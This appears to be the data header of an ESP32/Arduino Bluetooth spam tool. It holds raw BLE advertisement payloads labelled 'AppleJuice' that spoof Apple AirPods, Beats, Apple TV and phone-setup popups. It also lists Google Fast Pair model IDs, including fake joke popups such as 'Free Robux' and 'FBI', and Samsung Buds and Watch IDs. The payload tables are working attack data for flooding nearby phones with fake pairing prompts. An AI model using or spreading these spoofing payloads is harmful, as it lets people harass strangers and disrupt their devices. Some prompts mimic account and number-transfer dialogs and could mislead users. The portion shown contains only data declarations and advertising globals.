#include <NimBLEDevice.h>
// globals for passing bluetooth info between routines
// AppleJuice Payload Data 
uint8_t Airpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AirpodsProGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t PowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t PowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsStudioBuds[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 
uint8_t BeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsStudioPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t BeatsStudioBudsPlus[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t AppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVNewUser[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVAppleIDSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVWirelessAudioSync[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVHomekitSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVKeyboard[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleTVConnectingToNetwork[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t HomepodSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t SetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t TransferNumber[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t TVColorBalance[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t AppleVisionPro[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t* data;
int deviceType = 0; 

struct DeviceType {
    uint32_t value;
    String name;
};

DeviceType android_models[] = {
    // Genuine non-production/forgotten (good job Google)
    {0x0001F0, "Bisto CSR8670 Dev Board"},
    {0x000047, "Arduino 101"},
    {0x470000, "Arduino 101 2"},
    {0x00000A, "Anti-Spoof Test"},
    {0x0A0000, "Anti-Spoof Test 2"},
    {0x00000B, "Google Gphones"},
    {0x0B0000, "Google Gphones 2"},
    {0x0C0000, "Google Gphones 3"},
    {0x00000D, "Test 00000D"},
    {0x000007, "Android Auto"},
    {0x070000, "Android Auto 2"},
    {0x000008, "Foocorp Foophones"},
    {0x080000, "Foocorp Foophones 2"},
    {0x000009, "Test Android TV"},
    {0x090000, "Test Android TV 2"},
    {0x000035, "Test 000035"},
    {0x350000, "Test 000035 2"},
    {0x000048, "Fast Pair Headphones"},
    {0x480000, "Fast Pair Headphones 2"},
    {0x000049, "Fast Pair Headphones 3"},
    {0x490000, "Fast Pair Headphones 4"},
    {0x001000, "LG HBS1110"},
    {0x00B727, "Smart Controller 1"},
    {0x01E5CE, "BLE-Phone"},
    {0x0200F0, "Goodyear"},
    {0x00F7D4, "Smart Setup"},
    {0xF00002, "Goodyear"},
    {0xF00400, "T10"},
    {0x1E89A7, "ATS2833_EVB"},

    // Phone setup
    {0x00000C, "Google Gphones Transfer"},
    {0x0577B1, "Galaxy S23 Ultra"},
    {0x05A9BC, "Galaxy S20+"},

    // Genuine devices
    {0xCD8256, "Bose NC 700"},
    {0x0000F0, "Bose QuietComfort 35 II"},
    {0xF00000, "Bose QuietComfort 35 II 2"},
    {0x821F66, "JBL Flip 6"},
    {0xF52494, "JBL Buds Pro"},
    {0x718FA4, "JBL Live 300TWS"},
    {0x0002F0, "JBL Everest 110GA"},
    {0x92BBBD, "Pixel Buds"},
    {0x000006, "Google Pixel buds"},
    {0x060000, "Google Pixel buds 2"},
    {0xD446A7, "Sony XM5"},
    {0x2D7A23, "Sony WF-1000XM4"},
    {0x0E30C3, "Razer Hammerhead TWS"},
    {0x72EF8D, "Razer Hammerhead TWS X"},
    {0x72FB00, "Soundcore Spirit Pro GVA"},
    {0x0003F0, "LG HBS-835S"},
    {0x002000, "AIAIAI TMA-2 (H60)"},
    {0x003000, "Libratone Q Adapt On-Ear"},
    {0x003001, "Libratone Q Adapt On-Ear 2"},
    {0x00A168, "boAt  Airdopes 621"},
    {0x00AA48, "Jabra Elite 2"},
    {0x00AA91, "Beoplay E8 2.0"},
    {0x00C95C, "Sony WF-1000X"},
    {0x01EEB4, "WH-1000XM4"},
    {0x02AA91, "B&O Earset"},
    {0x01C95C, "Sony WF-1000X"},
    {0x02D815, "ATH-CK1TW"},
    {0x035764, "PLT V8200 Series"},
    {0x038CC7, "JBL TUNE760NC"},
    {0x02DD4F, "JBL TUNE770NC"},
    {0x02E2A9, "TCL MOVEAUDIO S200"},
    {0x035754, "Plantronics PLT_K2"},
    {0x02C95C, "Sony WH-1000XM2"},
    {0x038B91, "DENON AH-C830NCW"},
    {0x02F637, "JBL LIVE FLEX"},
    {0x02D886, "JBL REFLECT MINI NC"},
    {0xF00000, "Bose QuietComfort 35 II"},
    {0xF00001, "Bose QuietComfort 35 II"},
    {0xF00201, "JBL Everest 110GA"},
    {0xF00204, "JBL Everest 310GA"},
    {0xF00209, "JBL LIVE400BT"},
    {0xF00205, "JBL Everest 310GA"},
    {0xF00200, "JBL Everest 110GA"},
    {0xF00208, "JBL Everest 710GA"},
    {0xF00207, "JBL Everest 710GA"},
    {0xF00206, "JBL Everest 310GA"},
    {0xF0020A, "JBL LIVE400BT"},
    {0xF0020B, "JBL LIVE400BT"},
    {0xF0020C, "JBL LIVE400BT"},
    {0xF00203, "JBL Everest 310GA"},
    {0xF00202, "JBL Everest 110GA"},
    {0xF00213, "JBL LIVE650BTNC"},
    {0xF0020F, "JBL LIVE500BT"},
    {0xF0020E, "JBL LIVE500BT"},
    {0xF00214, "JBL LIVE650BTNC"},
    {0xF00212, "JBL LIVE500BT"},
    {0xF0020D, "JBL LIVE400BT"},
    {0xF00211, "JBL LIVE500BT"},
    {0xF00215, "JBL LIVE650BTNC"},
    {0xF00210, "JBL LIVE500BT"},
    {0xF00305, "LG HBS-1500"},
    {0xF00304, "LG HBS-1010"},
    {0xF00308, "LG HBS-1125"},
    {0xF00303, "LG HBS-930"},
    {0xF00306, "LG HBS-1700"},
    {0xF00300, "LG HBS-835S"},
    {0xF00309, "LG HBS-2000"},
    {0xF00302, "LG HBS-830"},
    {0xF00307, "LG HBS-1120"},
    {0xF00301, "LG HBS-835"},
    {0xF00E97, "JBL VIBE BEAM"},
    {0x04ACFC, "JBL WAVE BEAM"},
    {0x04AA91, "Beoplay H4"},
    {0x04AFB8, "JBL TUNE 720BT"},
    {0x05A963, "WONDERBOOM 3"},
    {0x05AA91, "B&O Beoplay E6"},
    {0x05C452, "JBL LIVE220BT"},
    {0x05C95C, "Sony WI-1000X"},
    {0x0602F0, "JBL Everest 310GA"},
    {0x0603F0, "LG HBS-1700"},
    {0x1E8B18, "SRS-XB43"},
    {0x1E955B, "WI-1000XM2"},
    {0x1EC95C, "Sony WF-SP700N"},
    {0x1ED9F9, "JBL WAVE FLEX"},
    {0x1EE890, "ATH-CKS30TW WH"},
    {0x1EEDF5, "Teufel REAL BLUE TWS 3"},
    {0x1F1101, "TAG Heuer Calibre E4 45mm"},
    {0x1F181A, "LinkBuds S"},
    {0x1F2E13, "Jabra Elite 2"},
    {0x1F4589, "Jabra Elite 2"},
    {0x1F4627, "SRS-XG300"},
    {0x1F5865, "boAt Airdopes 441"},
    {0x1FBB50, "WF-C700N"},
    {0x1FC95C, "Sony WF-SP700N"},
    {0x1FE765, "TONE-TF7Q"},
    {0x1FF8FA, "JBL REFLECT MINI NC"},
    {0x201C7C, "SUMMIT"},
    {0x202B3D, "Amazfit PowerBuds"},
    {0x20330C, "SRS-XB33"},
    {0x003B41, "M&D MW65"},
    {0x003D8A, "Cleer FLOW II"},
    {0x005BC3, "Panasonic RP-HD610N"},
    {0x008F7D, "soundcore Glow Mini"},
    {0x00FA72, "Pioneer SE-MS9BN"},
    {0x0100F0, "Bose QuietComfort 35 II"},
    {0x011242, "Nirvana Ion"},
    {0x013D8A, "Cleer EDGE Voice"},
    {0x01AA91, "Beoplay H9 3rd Generation"},
    {0x038F16, "Beats Studio Buds"},
    {0x039F8F, "Michael Kors Darci 5e"},
    {0x03AA91, "B&O Beoplay H8i"},
    {0x03B716, "YY2963"},
    {0x03C95C, "Sony WH-1000XM2"},
    {0x03C99C, "MOTO BUDS 135"},
    {0x03F5D4, "Writing Account Key"},
    {0x045754, "Plantronics PLT_K2"},
    {0x045764, "PLT V8200 Series"},
    {0x04C95C, "Sony WI-1000X"},
    {0x050F0C, "Major III Voice"},
    {0x052CC7, "MINOR III"},
    {0x057802, "TicWatch Pro 5"},
    {0x0582FD, "Pixel Buds"},
    {0x058D08, "WH-1000XM4"},
    {0x06AE20, "Galaxy S21 5G"},
    {0x06C197, "OPPO Enco Air3 Pro"},
    {0x06C95C, "Sony WH-1000XM2"},
    {0x06D8FC, "soundcore Liberty 4 NC"},
    {0x0744B6, "Technics EAH-AZ60M2"},
    {0x07A41C, "WF-C700N"},
    {0x07C95C, "Sony WH-1000XM2"},
    {0x07F426, "Nest Hub Max"},
    {0x0102F0, "JBL Everest 110GA - Gun Metal"},
    {0x0202F0, "JBL Everest 110GA - Silver"},
    {0x0302F0, "JBL Everest 310GA - Brown"},
    {0x0402F0, "JBL Everest 310GA - Gun Metal"},
    {0x0502F0, "JBL Everest 310GA - Silver"},
    {0x0702F0, "JBL Everest 710GA - Gun Metal"},
    {0x0802F0, "JBL Everest 710GA - Silver"},
    {0x054B2D, "JBL TUNE125TWS"},
    {0x0660D7, "JBL LIVE770NC"},
    {0x0103F0, "LG HBS-835"},
    {0x0203F0, "LG HBS-830"},
    {0x0303F0, "LG HBS-930"},
    {0x0403F0, "LG HBS-1010"},
    {0x0503F0, "LG HBS-1500"},
    {0x0703F0, "LG HBS-1120"},
    {0x0803F0, "LG HBS-1125"},
    {0x0903F0, "LG HBS-2000"},

    // Custom debug popups
    {0xD99CA1, "Flipper Zero"},
    {0x77FF67, "Free Robux"},
    {0xAA187F, "Free VBucks"},
    {0xDCE9EA, "Rickroll"},
    {0x87B25F, "Animated Rickroll"},
    {0x1448C9, "BLM"},
    {0x13B39D, "Talking Sasquach"},
    {0x7C6CDB, "Obama"},
    {0x005EF9, "Ryanair"},
    {0xE2106F, "FBI"},
    {0xB37A62, "Tesla"},
    {0x92ADC9, "Ton Upgrade Netflix"},
};

inline struct {
    uint32_t value;
    const char* name;
} buds_models[] = {
    {0xEE7A0C, "Fallback Buds"},
    {0x9D1700, "Fallback Dots"},
    {0x39EA48, "Light Purple Buds2"},
    {0xA7C62C, "Bluish Silver Buds2"},
    {0x850116, "Black Buds Live"},
    {0x3D8F41, "Gray & Black Buds2"},
    {0x3B6D02, "Bluish Chrome Buds2"},
    {0xAE063C, "Gray Beige Buds2"},
    {0xB8B905, "Pure White Buds"},
    {0xEAAA17, "Pure White Buds2"},
    {0xD30704, "Black Buds"},
    {0x9DB006, "French Flag Buds"},
    {0x101F1A, "Dark Purple Buds Live"},
    {0x859608, "Dark Blue Buds"},
    {0x8E4503, "Pink Buds"},
    {0x2C6740, "White & Black Buds2"},
    {0x3F6718, "Bronze Buds Live"},
    {0x42C519, "Red Buds Live"},
    {0xAE073A, "Black & White Buds2"},
    {0x011716, "Sleek Black Buds2"},
};

struct WatchModel
{
    uint8_t value;
    const char *name;
};

inline WatchModel* watch_models = new WatchModel[26] 
{
    {0x1A, "Fallback Watch"},
    {0x01, "White Watch4 Classic 44m"},
    {0x02, "Black Watch4 Classic 40m"},
    {0x03, "White Watch4 Classic 40m"},
    {0x04, "Black Watch4 44mm"},
    {0x05, "Silver Watch4 44mm"},
    {0x06, "Green Watch4 44mm"},
    {0x07, "Black Watch4 40mm"},
    {0x08, "White Watch4 40mm"},
    {0x09, "Gold Watch4 40mm"},
    {0x0A, "French Watch4"},
    {0x0B, "French Watch4 Classic"},
    {0x0C, "Fox Watch5 44mm"},
    {0x11, "Black Watch5 44mm"},
    {0x12, "Sapphire Watch5 44mm"},
    {0x13, "Purpleish Watch5 40mm"},
    {0x14, "Gold Watch5 40mm"},
    {0x15, "Black Watch5 Pro 45mm"},
    {0x16, "Gray Watch5 Pro 45mm"},
    {0x17, "White Watch5 44mm"},
    {0x18, "White & Black Watch5"},
    {0x1B, "Black Watch6 Pink 40mm"},
    {0x1C, "Gold Watch6 Gold 40mm"},
    {0x1D, "Silver Watch6 Cyan 44mm"},
    {0x1E, "Black Watch6 Classic 43m"},
    {0x20, "Green Watch6 Classic 43m"},
};

int samsung_buds_count = (sizeof(buds_models) / sizeof(buds_models[0]));

int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));

BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
BLEAdvertising *pAdvertising;
